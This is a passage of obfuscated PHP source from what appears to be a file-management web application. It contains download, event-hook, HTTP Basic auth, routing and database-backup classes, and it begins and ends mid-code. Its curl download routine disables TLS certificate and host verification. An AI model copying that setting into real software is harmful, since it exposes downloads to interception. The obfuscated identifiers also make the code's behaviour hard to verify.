self::checkGzip($F‰Î¡ˆØÊ­); if (!@rename($F‰Î¡ˆØÊ­, $F ´›–èñ…)) { @unlink($F ´›–èñ…); $b­Àøë÷¥ä = @rename($F‰Î¡ˆØÊ­, $F ´›–èñ…); if (!$b­Àøë÷¥ä) { return array($D¡Î­áó†à[781] => !1, $D¡Î­áó†à[783] => $D¡Î­áó†à[1175]); } } return array($D¡Î­áó†à[781] => !0, $D¡Î­áó†à[783] => $D¡Î­áó†à[461]); } goto d¯—Ø®º·‘; d¯—Ø®º·‘: return array($D¡Î­áó†à[781] => !1, $D¡Î­áó†à[783] => $D¡Î­áó†à[1176]); goto eá”¬Šªò³; AçíÇ‰ÎŞ: $D¡Î­áó†à =& $_SERVER[°Óó£ÌİóèÅ]; $F‰Î¡ˆØÊ­ = $F ´›–èñ… . $D¡Î­áó†à[1161]; set_timeout(); goto Aµ«™…ƒ”ê; b²Ñ¯öŠ: curl_setopt($A‚ËÉ¦ù, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($A‚ËÉ¦ù, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($A‚ËÉ¦ù, CURLOPT_SSL_VERIFYHOST, 0); goto DÔ¯¥Ôêµƒ; c¡Æ»Ø››Ÿ: curl_setopt($A‚ËÉ¦ù, CURLOPT_USERAGENT, $D¡Î­áó†à[1166]); $b­Àøë÷¥ä = curl_exec($A‚ËÉ¦ù); curl_progress_end($A‚ËÉ¦ù); goto cí—ÀøÁ‡¹; Aµ«™…ƒ”ê: $cµ¯ô°à˜ = @fopen($F‰Î¡ˆØÊ­, $D¡Î­áó†à[485]); if (!$cµ¯ô°à˜) { return array($D¡Î­áó†à[781] => !1, $D¡Î­áó†à[783] => $D¡Î­áó†à[1174]); } $A‚ËÉ¦ù = curl_init($FÒùŒœÓ¹Ú); goto d×Ï¯¦‹Ñ‡; eá”¬Šªò³: } static function checkGzip($CÕíŞõ´‚¥) { goto eˆ‚Î¹ŞÑ§; CíáÚ¬ Ş: ob_start(); readgzfile($CÕíŞõ´‚¥); $Aë°¶‡Í = ob_get_clean(); goto aÃˆÖÇ¦”¢; eˆ‚Î¹ŞÑ§: $DÆ½èğ®« = $_SERVER[°Óó£ÌİóèÅ][1177]; $cî×Ä°æÌ› = file_sub_str($CÕíŞõ´‚¥, 0, 2); if ($DÆ½èğ®« != $cî×Ä°æÌ›) { return; } goto CíáÚ¬ Ş; aÃˆÖÇ¦”¢: file_put_contents($CÕíŞõ´‚¥, $Aë°¶‡Í); goto BìĞÛõ¹; BìĞÛõ¹: } } class Hook { private static $events = array(); public static function get($a•Ù”¯“ = false) { if (!$a•Ù”¯“) { return self::$events; } else { return self::$events[$a•Ù”¯“]; } } public static function apply($fšÚ‰À£Ò, $E¶Âá„†¥Ã = array()) { $aâÆÔè«‡ = ActionApply($fšÚ‰À£Ò, $E¶Âá„†¥Ã); if (is_string($fšÚ‰À£Ò)) { Hook::trigger($fšÚ‰À£Ò); } return $aâÆÔè«‡; } public static function bind($dŒèİÙÙß¨, $c²³Â›‹•, $C‚º‘Åó’ª = false) { $bÃÑÁÊÎÄÖ =& $_SERVER[°Óó£ÌİóèÅ]; if (!isset(self::$events[$dŒèİÙÙß¨])) { self::$events[$dŒèİÙÙß¨] = array(); } self::$events[$dŒèİÙÙß¨][] = array($bÃÑÁÊÎÄÖ[1178] => $c²³Â›‹•, $bÃÑÁÊÎÄÖ[1179] => $C‚º‘Åó’ª, $bÃÑÁÊÎÄÖ[1180] => 0); } public static function once($C·ëóÛ¨ï°, $bªÄ©ª¸ÀÃ) { self::bind($C·ëóÛ¨ï°, $bªÄ©ª¸ÀÃ, !0); } public static function unbind($A“÷¬©Ã³×, $CÏ½ƒéÅ÷ = false) { if (!$CÏ½ƒéÅ÷) { self::$events[$A“÷¬©Ã³×] = array(); return; } $aÃñäø®¨Ø = self::$events[$A“÷¬©Ã³×]; self::$events[$A“÷¬©Ã³×] = array(); for ($CÄ§“Şœ×Ü = 0; $CÄ§“Şœ×Ü < count($aÃñäø®¨Ø); $CÄ§“Şœ×Ü++) { if ($aÃñäø®¨Ø[$CÄ§“Şœ×Ü][$_SERVER[°Óó£ÌİóèÅ][1178]] == $CÏ½ƒéÅ÷) { continue; } self::$events[$A“÷¬©Ã³×][] = $aÃñäø®¨Ø[$CÄ§“Şœ×Ü]; } } public static function filter($CĞ³¡œÈİÍ, $F¨Í¨¶Š) { goto a£ö¤½ë½; dÅä‰ä˜ĞÉ: $aã«§²Ñ¤ñ = $c³”÷´–öÅ[$CĞ³¡œÈİÍ]; $D”Á£ù´‘é = $F¨Í¨¶Š; if (!is_array($aã«§²Ñ¤ñ) || count($aã«§²Ñ¤ñ) == 0) { return $D”Á£ù´‘é; } goto C±“ößè; a£ö¤½ë½: $e »—¢Ú =& $_SERVER[°Óó£ÌİóèÅ]; $c³”÷´–öÅ = self::$events; if (!isset($c³”÷´–öÅ[$CĞ³¡œÈİÍ])) { return $F¨Í¨¶Š; } goto dÅä‰ä˜ĞÉ; C±“ößè: for ($C£•¿£¬§à = 0; $C£•¿£¬§à < count($aã«§²Ñ¤ñ); $C£•¿£¬§à++) { $AØÄÅß†É× = $aã«§²Ñ¤ñ[$C£•¿£¬§à]; if ($AØÄÅß†É×[$e »—¢Ú[1179]] && $AØÄÅß†É×[$e »—¢Ú[1180]] > 1) { continue; } self::$events[$CĞ³¡œÈİÍ][$C£•¿£¬§à][$e »—¢Ú[1180]] = $AØÄÅß†É×[$e »—¢Ú[1180]] + 1; $CéæĞ¡´Ò  = self::apply($AØÄÅß†É×[$e »—¢Ú[1178]], array($D”Á£ù´‘é)); if (!is_null($CéæĞ¡´Ò )) { $D”Á£ù´‘é = $CéæĞ¡´Ò ; } } return $D”Á£ù´‘é; goto dòİÓï®«ç; dòİÓï®«ç: } public static function trigger($A•ˆÈ¿…²) { goto câÕ‰‘¯ˆ…; EÆ¯¦İ¸Ò®: if (!isset($DôÉß„ÅÃ„[$A•ˆÈ¿…²])) { return $cª²¨æ‘©ö; } $fÒö…ï âñ = $DôÉß„ÅÃ„[$A•ˆÈ¿…²]; if (!is_array($fÒö…ï âñ) || count($fÒö…ï âñ) == 0) { return $cª²¨æ‘©ö; } goto Bííé½¢; fá°ÜÒØ¶»: return $cª²¨æ‘©ö; goto aäóš¦İ£»; câÕ‰‘¯ˆ…: $EèˆÅ²ºƒ =& $_SERVER[°Óó£ÌİóèÅ]; $DôÉß„ÅÃ„ = self::$events; $cª²¨æ‘©ö = !1; goto EÆ¯¦İ¸Ò®; Bííé½¢: $aŒ½—ôæ§ = func_get_args(); array_shift($aŒ½—ôæ§); for ($CŠ¯Ö˜Œİ¬ = 0; $CŠ¯Ö˜Œİ¬ < count($fÒö…ï âñ); $CŠ¯Ö˜Œİ¬++) { $a–²…Óáº = $fÒö…ï âñ[$CŠ¯Ö˜Œİ¬]; if ($a–²…Óáº[$EèˆÅ²ºƒ[1179]] && $a–²…Óáº[$EèˆÅ²ºƒ[1180]] > 1) { continue; } if (defined($EèˆÅ²ºƒ[1181]) && GLOBAL_LOG_HOOK) { write_log($A•ˆÈ¿…² . $EèˆÅ²ºƒ[1182] . $a–²…Óáº[$EèˆÅ²ºƒ[1178]], $EèˆÅ²ºƒ[1183]); } self::$events[$A•ˆÈ¿…²][$CŠ¯Ö˜Œİ¬][$EèˆÅ²ºƒ[1180]] = $a–²…Óáº[$EèˆÅ²ºƒ[1180]] + 1; $Aë¨ÚÂ†ø£ = self::apply($a–²…Óáº[$EèˆÅ²ºƒ[1178]], $aŒ½—ôæ§); if (defined($EèˆÅ²ºƒ[1181]) && GLOBAL_LOG_HOOK) { write_log(get_caller_info(), $EèˆÅ²ºƒ[1183]); if ($a–²…Óáº[$EèˆÅ²ºƒ[1180]] == 200) { $cåÏøŞİŸ£ = is_array($a–²…Óáº[$EèˆÅ²ºƒ[1178]]) ? json_encode_force($a–²…Óáº[$EèˆÅ²ºƒ[1178]]) : $a–²…Óáº[$EèˆÅ²ºƒ[1178]]; write_log($EèˆÅ²ºƒ[1184] . $A•ˆÈ¿…² . $EèˆÅ²ºƒ[1185] . $cåÏøŞİŸ£, $EèˆÅ²ºƒ[1186]); } } $cª²¨æ‘©ö = is_null($Aë¨ÚÂ†ø£) ? $cª²¨æ‘©ö : $Aë¨ÚÂ†ø£; } goto fá°ÜÒØ¶»; aäóš¦İ£»: } } class HttpAuth { public static function get() { $AÌ¢¤Àé÷« =& $_SERVER[°Óó£ÌİóèÅ]; $f§§—¼­Â = $AÌ¢¤Àé÷«[33]; $bµöŒï¦Óà = $AÌ¢¤Àé÷«[33]; if (isset($_SERVER[$AÌ¢¤Àé÷«[1187]])) { $f§§—¼­Â = $_SERVER[$AÌ¢¤Àé÷«[1187]]; $bµöŒï¦Óà = $_SERVER[$AÌ¢¤Àé÷«[1188]]; } elseif (isset($_SERVER[$AÌ¢¤Àé÷«[1189]])) { $F§µ´çÕ£« = $_SERVER[$AÌ¢¤Àé÷«[1189]]; if (strpos(strtolower($F§µ´çÕ£«), $AÌ¢¤Àé÷«[1190]) === 0) { $Aƒ‰”æ« = explode($AÌ¢¤Àé÷«[4], base64_decode(substr($F§µ´çÕ£«, 6))); $f§§—¼­Â = isset($Aƒ‰”æ«[0]) ? $Aƒ‰”æ«[0] : $AÌ¢¤Àé÷«[33]; $bµöŒï¦Óà = isset($Aƒ‰”æ«[1]) ? $Aƒ‰”æ«[1] : 0; } } return array($AÌ¢¤Àé÷«[424] => $f§§—¼­Â, $AÌ¢¤Àé÷«[664] => $bµöŒï¦Óà); } public static function error() { goto CÖ³İöÌ’½; b·‹·ÁÓ–Ğ: die; goto FÆ®Ï¼ù‡; CÖ³İöÌ’½: $D”Æ‰×¥Ã¸ =& $_SERVER[°Óó£ÌİóèÅ]; header($D”Æ‰×¥Ã¸[1191]); header($D”Æ‰×¥Ã¸[1192]); goto CÛÙ°­áã; CÛÙ°­áã: header($D”Æ‰×¥Ã¸[1193]); header($D”Æ‰×¥Ã¸[1194]); header($D”Æ‰×¥Ã¸[1195]); goto b·‹·ÁÓ–Ğ; FÆ®Ï¼ù‡: } public static function make($C¥ÏµîÓ„‡, $e‹ãÌ›†ªÜ) { $f¯ÔëÖ‘¦ =& $_SERVER[°Óó£ÌİóèÅ]; return $f¯ÔëÖ‘¦[1196] + base64_encode($C¥ÏµîÓ„‡ . $f¯ÔëÖ‘¦[4] . $e‹ãÌ›†ªÜ); } } goto Aã¿ƒğ°õ; B‹ËˆÇäø: class Application { private $defaultModule = "\151\156\x64\x65\170"; private $defaultController = "\x69\x6e\144\145\170"; private $defaultAction = "\x69\156\x64\x65\x78"; public function setDefault($C‹ŒÓ¯ˆËË) { $Dµù¾êğ¯ =& $_SERVER[°Óó£ÌİóèÅ]; $AëÑ–ôÄïä = explode($Dµù¾êğ¯[100], trim($C‹ŒÓ¯ˆËË, $Dµù¾êğ¯[100])); $this->defaultModule = $AëÑ–ôÄïä[0] ? $AëÑ–ôÄïä[0] : $this->defaultModule; $this->defaultController = $AëÑ–ôÄïä[1] ? $AëÑ–ôÄïä[1] : $this->defaultController; $this->defaultAction = $AëÑ–ôÄïä[2] ? $AëÑ–ôÄïä[2] : $this->defaultAction; } public function appRun($CàÉ†ÊóÎ) { goto dò˜ó“ñ‰Š; fî‘¿Š¯©‘: $fØ•›º¾ÅÅ = $CÈßÁæÓšî[436]; if ($BóºÈ¡í‡Ü == $CÈßÁæÓšî[437]) { $fØ•›º¾ÅÅ = $CÈßÁæÓšî[438]; $CÙ‚Ï‚÷ºË[0] = $CÈßÁæÓšî[33]; $CÙ‚Ï‚÷ºË[1] = $CÙ‚Ï‚÷ºË[1] . $CÈßÁæÓšî[439]; $CàÉ†ÊóÎ = join($CÈßÁæÓšî[100], $CÙ‚Ï‚÷ºË); $CàÉ†ÊóÎ = trim($CàÉ†ÊóÎ, $CÈßÁæÓšî[100]); } Hook::trigger($fØ•›º¾ÅÅ . $CÈßÁæÓšî[440], $CàÉ†ÊóÎ); goto dçÕŒî”Ú¾; dçÕŒî”Ú¾: ActionCall($CàÉ†ÊóÎ); Hook::trigger($fØ•›º¾ÅÅ . $CÈßÁæÓšî[441], $CàÉ†ÊóÎ); goto FŞ—Ø¦™Šª; dò˜ó“ñ‰Š: $CÈßÁæÓšî =& $_SERVER[°Óó£ÌİóèÅ]; $CÙ‚Ï‚÷ºË = explode($CÈßÁæÓšî[100], $CàÉ†ÊóÎ); $BóºÈ¡í‡Ü = strtolower($CÙ‚Ï‚÷ºË[0]); goto fî‘¿Š¯©‘; FŞ—Ø¦™Šª: } private function autorun() { $cí‹îˆáã =& $_SERVER[°Óó£ÌİóèÅ]; global $config; if (count($config[$cí‹îˆáã[442]]) == 0) { return; } foreach ($config[$cí‹îˆáã[442]] as $bøµµ»îİÌ => $cÓá‡†‘©) { $this->appRun($cÓá‡†‘©); } } private function parsePluginRoute() { goto c°Şù‰˜¶×; e½‚¹ÍôãÅ: $GLOBALS[$dğÉœ†…á[7]][$dğÉœ†…á[444]] = implode($dğÉœ†…á[100], $GLOBALS[$dğÉœ†…á[7]][$dğÉœ†…á[443]]); goto F®í•—šïØ; C²ùŞğÆ£Œ: $c‚ÑôãÍ¡¢ = array($dğÉœ†…á[437], $fµƒ„¸‹Äâ); $Cæ§›õ®¦ç = array_slice($GLOBALS[$dğÉœ†…á[7]][$dğÉœ†…á[443]], 1); $GLOBALS[$dğÉœ†…á[7]][$dğÉœ†…á[443]] = array_merge($c‚ÑôãÍ¡¢, $Cæ§›õ®¦ç); goto e½‚¹ÍôãÅ; c°Şù‰˜¶×: $dğÉœ†…á =& $_SERVER[°Óó£ÌİóèÅ]; $f¨Ì¥µ¨Æ² = $dğÉœ†…á[437]; $D¦Âù ÅÍ = $GLOBALS[$dğÉœ†…á[7]][$dğÉœ†…á[443]][0]; goto a„¡áğğ¥¶; a„¡áğğ¥¶: if (!$D¦Âù ÅÍ || strlen($D¦Âù ÅÍ) <= strlen($f¨Ì¥µ¨Æ²)) { return; } if (strtolower(substr($D¦Âù ÅÍ, -strlen($f¨Ì¥µ¨Æ²))) != $f¨Ì¥µ¨Æ²) { return; } $fµƒ„¸‹Äâ = substr($D¦Âù ÅÍ, 0, -strlen($f¨Ì¥µ¨Æ²)); goto C²ùŞğÆ£Œ; F®í•—šïØ: } private function parseUriRoute() { goto Aàëªœ§ƒé; aØÙ„İ²è: $Aàˆš¹İö = $aß„ƒÓµ‡ù[446]; if (!strstr($e§¥’Æ¢ãç, $Aàˆš¹İö)) { return; } $DÖ±­ä¬º = strrpos($e§¥’Æ¢ãç, $Aàˆš¹İö); goto C–„ñÓŞÖ©; a¶´Äƒ˜Í: $GLOBALS[$aß„ƒÓµ‡ù[7]][$aß„ƒÓµ‡ù[443]] = explode($aß„ƒÓµ‡ù[8], $f„Î¤›ä¹™); $GLOBALS[$aß„ƒÓµ‡ù[7]][$aß„ƒÓµ‡ù[444]] = implode($aß„ƒÓµ‡ù[100], $GLOBALS[$aß„ƒÓµ‡ù[7]][$aß„ƒÓµ‡ù[443]]); goto A…ï§—«ŠÒ; C–„ñÓŞÖ©: $f„Î¤›ä¹™ = substr($e§¥’Æ¢ãç, $DÖ±­ä¬º + strlen($Aàˆš¹İö)); preg_match_all($aß„ƒÓµ‡ù[447], $f„Î¤›ä¹™, $d·®é÷å); $f„Î¤›ä¹™ = trim($d·®é÷å[0][0], $aß„ƒÓµ‡ù[8]); goto a¶´Äƒ˜Í; Aàëªœ§ƒé: $aß„ƒÓµ‡ù =& $_SERVER[°Óó£ÌİóèÅ]; if ($GLOBALS[$aß„ƒÓµ‡ù[7]][$aß„ƒÓµ‡ù[444]] != $aß„ƒÓµ‡ù[33]) { return; } $e§¥’Æ¢ãç = $_SERVER[$aß„ƒÓµ‡ù[445]]; goto aØÙ„İ²è; A…ï§—«ŠÒ: } public function run() { goto F„§ˆÍÑ¸; CìÒõ¤…¥ª: define($EƒªÌÚæ–¥[449], isset($b¥œ„„ôö¸[1]) && $b¥œ„„ôö¸[0] ? $b¥œ„„ôö¸[1] : $this->defaultController); define($EƒªÌÚæ–¥[450], isset($b¥œ„„ôö¸[2]) && $b¥œ„„ôö¸[0] ? $b¥œ„„ôö¸[2] : $this->defaultAction); define($EƒªÌÚæ–¥[451], MOD . $EƒªÌÚæ–¥[100] . ST . $EƒªÌÚæ–¥[100] . ACT); goto C‰ ‡÷‰¯©; C”«¡çøâ“: $b¥œ„„ôö¸ = $GLOBALS[$EƒªÌÚæ–¥[7]][$EƒªÌÚæ–¥[443]]; $aÍËáÙ°¶ª = $GLOBALS[$EƒªÌÚæ–¥[7]][$EƒªÌÚæ–¥[444]]; define($EƒªÌÚæ–¥[448], isset($b¥œ„„ôö¸[0]) && $b¥œ„„ôö¸[0] ? $b¥œ„„ôö¸[0] : $this->defaultModule); goto CìÒõ¤…¥ª; F„§ˆÍÑ¸: $EƒªÌÚæ–¥ =& $_SERVER[°Óó£ÌİóèÅ]; $this->parseUriRoute(); $this->parsePluginRoute(); goto C”«¡çøâ“; C‰ ‡÷‰¯©: $this->autorun(); if (count($b¥œ„„ôö¸) >= 3) { $this->appRun($aÍËáÙ°¶ª); } else { $this->appRun(ACTION); } goto A†˜’Ğ‚éŞ; A†˜’Ğ‚éŞ: } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $CÇĞî½ÏÆ° =& $_SERVER[°Óó£ÌİóèÅ]; self::$name = date($CÇĞî½ÏÆ°[452]); if (!($cµä´ß‘‹’ = Model($CÇĞî½ÏÆ°[453])->lastItem())) { $cµä´ß‘‹’ = $this->initData(); } else { self::$name = $cµä´ß‘‹’[$CÇĞî½ÏÆ°[28]]; if ($cµä´ß‘‹’[$CÇĞî½ÏÆ°[454]] == $CÇĞî½ÏÆ°[384]) { self::$name = date($CÇĞî½ÏÆ°[455]); $D”¶…Ğè†™ = 0; if (isset($cµä´ß‘‹’[$CÇĞî½ÏÆ°[292]][$CÇĞî½ÏÆ°[172]][$CÇĞî½ÏÆ°[390]])) { $D”¶…Ğè†™ = (int) $cµä´ß‘‹’[$CÇĞî½ÏÆ°[292]][$CÇĞî½ÏÆ°[172]][$CÇĞî½ÏÆ°[390]]; } if ($cµä´ß‘‹’[$CÇĞî½ÏÆ°[28]] == self::$name) { Model($CÇĞî½ÏÆ°[453])->remove($cµä´ß‘‹’[$CÇĞî½ÏÆ°[376]]); } $cµä´ß‘‹’ = $this->initData($D”¶…Ğè†™, $cµä´ß‘‹’[$CÇĞî½ÏÆ°[456]]); } else { $this->checkStore($cµä´ß‘‹’[$CÇĞî½ÏÆ°[456]]); } } self::$option = $cµä´ß‘‹’; } private function initData($cŞ¦ †ƒç‡ = 0, $E£ãçÚë« = '') { goto cÂ°çš…ö‚; cÂ°çš…ö‚: $dÂ¹©ÓÎ¨ =& $_SERVER[°Óó£ÌİóèÅ]; $cŸ¦Ä³™åÜ = Model($dÂ¹©ÓÎ¨[453])->config(); if ($E£ãçÚë« && $cŸ¦Ä³™åÜ[$dÂ¹©ÓÎ¨[456]] != $E£ãçÚë«) { $cŞ¦ †ƒç‡ = 0; } goto D…†–áŸ›Õ; f˜æ‘ìÖÉä: $AùºÜÊè‚×[$dÂ¹©ÓÎ¨[376]] = $cß‘‹‚§‹È; return $AùºÜÊè‚×; goto e¯Ê•î²›; D…†–áŸ›Õ: $this->checkStore($cŸ¦Ä³™åÜ[$dÂ¹©ÓÎ¨[456]]); $AùºÜÊè‚× = array($dÂ¹©ÓÎ¨[456] => $cŸ¦Ä³™åÜ[$dÂ¹©ÓÎ¨[456]], $dÂ¹©ÓÎ¨[28] => self::$name, $dÂ¹©ÓÎ¨[454] => 0, $dÂ¹©ÓÎ¨[457] => $cŸ¦Ä³™åÜ[$dÂ¹©ÓÎ¨[457]], $dÂ¹©ÓÎ¨[292] => array($dÂ¹©ÓÎ¨[458] => array($dÂ¹©ÓÎ¨[454] => 0), $dÂ¹©ÓÎ¨[459] => array($dÂ¹©ÓÎ¨[454] => 0, $dÂ¹©ÓÎ¨[460] => 0, $dÂ¹©ÓÎ¨[461] => 0, $dÂ¹©ÓÎ¨[29] => $dÂ¹©ÓÎ¨[33]), $dÂ¹©ÓÎ¨[462] => array($dÂ¹©ÓÎ¨[454] => 0, $dÂ¹©ÓÎ¨[460] => 0, $dÂ¹©ÓÎ¨[461] => 0), $dÂ¹©ÓÎ¨[172] => array($dÂ¹©ÓÎ¨[454] => 0, $dÂ¹©ÓÎ¨[463] => 0, $dÂ¹©ÓÎ¨[464] => 0, $dÂ¹©ÓÎ¨[465] => 0, $dÂ¹©ÓÎ¨[466] => 0, $dÂ¹©ÓÎ¨[390] => $cŞ¦ †ƒç‡)), $dÂ¹©ÓÎ¨[467] => time(), $dÂ¹©ÓÎ¨[468] => 0); $cß‘‹‚§‹È = Model($dÂ¹©ÓÎ¨[453])->insert($AùºÜÊè‚×); goto f˜æ‘ìÖÉä; e¯Ê•î²›: } private function checkStore($c±£‘‹šš‘) { $cº‹à×ø¯µ =& $_SERVER[°Óó£ÌİóèÅ]; $aøãÓÎê‘ = Model($cº‹à×ø¯µ[469])->listData($c±£‘‹šš‘); Model($cº‹à×ø¯µ[469])->checkConfig($aøãÓÎê‘); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[°Óó£ÌİóèÅ][453])->findByName(self::$name); } return self::$option; } public static function set($DåæŞ’•…Õ) { $f¯íšÎ•Ğ× =& $_SERVER[°Óó£ÌİóèÅ]; $B¨ŞÖ ¬½ä = self::get(); foreach ($DåæŞ’•…Õ as $C…äò›ã => $cÚòªÀ¬Õ×) { $eâÜŒ®ä’» = explode($f¯íšÎ•Ğ×[100], $C…äò›ã); $a²ó«éĞ•Œ = count($eâÜŒ®ä’»); switch ($a²ó«éĞ•Œ) { case 1: $B¨ŞÖ ¬½ä[$eâÜŒ®ä’»[0]] = $cÚòªÀ¬Õ×; break; case 2: $B¨ŞÖ ¬½ä[$eâÜŒ®ä’»[0]][$eâÜŒ®ä’»[1]] = $cÚòªÀ¬Õ×; break; case 3: $B¨ŞÖ ¬½ä[$eâÜŒ®ä’»[0]][$eâÜŒ®ä’»[1]][$eâÜŒ®ä’»[2]] = $cÚòªÀ¬Õ×; break; } } Model($f¯íšÎ•Ğ×[453])->update($B¨ŞÖ ¬½ä[$f¯íšÎ•Ğ×[376]], $B¨ŞÖ ¬½ä); self::$option = $B¨ŞÖ ¬½ä; return self::$option; } public function keep() { $B¦®’ÕÜ‹· =& $_SERVER[°Óó£ÌİóèÅ]; $C×ÖÖ††ƒ = self::get(); if ($C×ÖÖ††ƒ[$B¦®’ÕÜ‹·[292]][$B¦®’ÕÜ‹·[458]][$B¦®’ÕÜ‹·[454]] == $B¦®’ÕÜ‹·[384]) { return; } $this->backupKeep($C×ÖÖ††ƒ); self::set(array($B¦®’ÕÜ‹·[470] => 1)); } private function backupKeep($E¹Í½™‹à) { goto F˜óë«ø; F†£òÑ¦: $Fõ´„‘ôË = array_unique($Fõ´„‘ôË); foreach ($EÌ¡÷›‘åÊ as $cùéçÒõÁ) { if (!empty($cùéçÒõÁ[$E…ê½âÓ™‡[28]]) && in_array($cùéçÒõÁ[$E…ê½âÓ™‡[28]], $Fõ´„‘ôË)) { continue; } Model($E…ê½âÓ™‡[453])->remove($cùéçÒõÁ[$E…ê½âÓ™‡[376]]); $e“‘ö– = "\x7b\x69\157\x3a{$E¹Í½™‹à[$E…ê½âÓ™‡[456]]}\x7d\x2f\144\x61\x74\141\x62\141\163\145\57\x62\x61\143\153\165\x70\137{$cùéçÒõÁ[$E…ê½âÓ™‡[28]]}"; IO::remove($e“‘ö–, !1); } goto d„ãÃ¨Ñ²; fÒ©ÕäÜóÒ: $Fõ´„‘ôË = array(); for ($DŒ˜Ä§¼äš = 0; $DŒ˜Ä§¼äš <= 7; $DŒ˜Ä§¼äš++) { $Fõ´„‘ôË[] = date($E…ê½âÓ™‡[455], strtotime("\x2d{$DŒ˜Ä§¼äš}\40\x64\141\x79\x73")); } for ($DŒ˜Ä§¼äš = 0; $DŒ˜Ä§¼äš < 12; $DŒ˜Ä§¼äš++) { $Fõ´„‘ôË[] = date($E…ê½âÓ™‡[471], strtotime("\55{$DŒ˜Ä§¼äš}\40\155\x6f\156\x74\150\163")); } goto F†£òÑ¦; F˜óë«ø: $E…ê½âÓ™‡ =& $_SERVER[°Óó£ÌİóèÅ]; $EÌ¡÷›‘åÊ = Model($E…ê½âÓ™‡[453])->listData(); if (empty($EÌ¡÷›‘åÊ)) { return; } goto fÒ©ÕäÜóÒ; d„ãÃ¨Ñ²: } public function db() { goto D°¦âÇ‘ô; d×œì³ó™Š: $CøÈ¤’ŞÙµ = new BackupDb(); if (!$CøÈ¤’ŞÙµ->index()) { return !1; } self::set(array($f´ºİ®ì¿«[472] => 1)); goto F…Ò¬¼ãÒ; D°¦âÇ‘ô: $f´ºİ®ì¿« =& $_SERVER[°Óó£ÌİóèÅ]; $A¤ù’ñ‰„ = self::get(); if ($A¤ù’ñ‰„[$f´ºİ®ì¿«[292]][$f´ºİ®ì¿«[459]][$f´ºİ®ì¿«[454]] == $f´ºİ®ì¿«[384]) { return !0; } goto d×œì³ó™Š; F…Ò¬¼ãÒ: return !0; goto c¹•‡Ø¥ÙÅ; c¹•‡Ø¥ÙÅ: } public function dbFile() { goto f…ßè¹¨¨Ò; fš„¿ğ‚»§: return !0; goto B±½‘Ä¿©‹; Cá¹ìÉ…’¡: $cŠŞé½‹ñ§ = new BackupDbFile(); if (!$cŠŞé½‹ñ§->index()) { return !1; } self::set(array($FãŒ¯©ˆø[473] => 1)); goto fš„¿ğ‚»§; f…ßè¹¨¨Ò: $FãŒ¯©ˆø =& $_SERVER[°Óó£ÌİóèÅ]; $aŒòÖƒ¹¤‘ = self::get(); if ($aŒòÖƒ¹¤‘[$FãŒ¯©ˆø[292]][$FãŒ¯©ˆø[462]][$FãŒ¯©ˆø[454]] == $FãŒ¯©ˆø[384]) { return !0; } goto Cá¹ìÉ…’¡; B±½‘Ä¿©‹: } public function file() { $fÃ½†²·âñ =& $_SERVER[°Óó£ÌİóèÅ]; $eÇ„Ó¨ñÓë = self::get(); if ($eÇ„Ó¨ñÓë[$fÃ½†²·âñ[292]][$fÃ½†²·âñ[172]][$fÃ½†²·âñ[454]] == $fÃ½†²·âñ[384]) { return !0; } if (!isset($eÇ„Ó¨ñÓë[$fÃ½†²·âñ[457]]) || $eÇ„Ó¨ñÓë[$fÃ½†²·âñ[457]] == $fÃ½†²·âñ[410]) { $F´Æê°Æô = new BackupFile(); if (!$F´Æê°Æô->index()) { return !1; } } self::set(array($fÃ½†²·âñ[474] => 1, $fÃ½†²·âñ[454] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E „øÌÔ´; bâø»ÍìÜ: $Cç‰íÆƒ = TEMP_FILES . $eÙÇ­ÛÊ[483] . self::$name . $eÙÇ­ÛÊ[8]; del_dir($Cç‰íÆƒ); mk_dir($Cç‰íÆƒ); goto C«…é†Ìå; C«…é†Ìå: foreach ($FÆÁÕ•Ã’ù as $D˜¾¢Ç­÷) { $D—ì‡ƒ¤±‘ = "{$Cç‰íÆƒ}{$D˜¾¢Ç­÷}\56\x73\161\154"; $D‚ÇÔñÔÏ‘ += $this->makeSqlFile($D˜¾¢Ç­÷, $D—ì‡ƒ¤±‘, $C¿»öÅæ·ƒ, $d›ÙùÓê˜); } $C¿»öÅæ·ƒ->end(); $D™£ùÁ÷†Õ = array($eÙÇ­ÛÊ[472] => 1, $eÙÇ­ÛÊ[484] => $D‚ÇÔñÔÏ‘); goto F†ËôŞÆñš; F†ËôŞÆñš: Backup::set($D™£ùÁ÷†Õ); return !0; goto e²ëÙµŒÛ¶; CššÎ¸µÓ…: $D™£ùÁ÷†Õ = array($eÙÇ­ÛÊ[480] => $eÙÇ­ÛÊ[481], $eÙÇ­ÛÊ[482] => $EŸ»¿ñ£ºá + 1); Backup::set($D™£ùÁ÷†Õ); $D‚ÇÔñÔÏ‘ = 0; goto bâø»ÍìÜ; EÓ©ã‡ªù¹: self::$name = $d›ÙùÓê˜[$eÙÇ­ÛÊ[28]]; if ($F§¤ğ÷âªç = $this->sqliteFile()) { return $this->sqliteBackup($F§¤ğ÷âªç); } $EŸ»¿ñ£ºá = 0; goto dî¨ˆïÎÖ’; dî¨ˆïÎÖ’: $FÆÁÕ•Ã’ù = Model()->db()->getTables(); foreach ($FÆÁÕ•Ã’ù as $D˜¾¢Ç­÷) { $EŸ»¿ñ£ºá += Model($D˜¾¢Ç­÷)->count(); } $C¿»öÅæ·ƒ = new Task($eÙÇ­ÛÊ[475], $eÙÇ­ÛÊ[476], $EŸ»¿ñ£ºá, LNG($eÙÇ­ÛÊ[477]) . $eÙÇ­ÛÊ[478] . LNG($eÙÇ­ÛÊ[479])); goto CššÎ¸µÓ…; E „øÌÔ´: $eÙÇ­ÛÊ =& $_SERVER[°Óó£ÌİóèÅ]; $d›ÙùÓê˜ = Backup::get(); self::$io = $d›ÙùÓê˜[$eÙÇ­ÛÊ[456]]; goto EÓ©ã‡ªù¹; e²ëÙµŒÛ¶: } public function makeSqlFile($c–öù³Ù‚á, $B¹÷š·ããó, $Aé°çƒÊ«ˆ, $DªåÙœ©‰) { goto eéğå²’÷Î; Eé˜¨Š§£Ï: $BÛÙà˜Õè = Model($c–öù³Ù‚á)->getDbFields(); do { $B©îŒ‘œ à = Model($c–öù³Ù‚á)->field($BÛÙà˜Õè)->order($AùĞ±ĞÔ…Œ . $_SERVER[°Óó£ÌİóèÅ][486])->selectPage($CÂ„¤ò¢ç , $B¤ÇÖ›å‹Ú); $aåîÂ’àîµ = 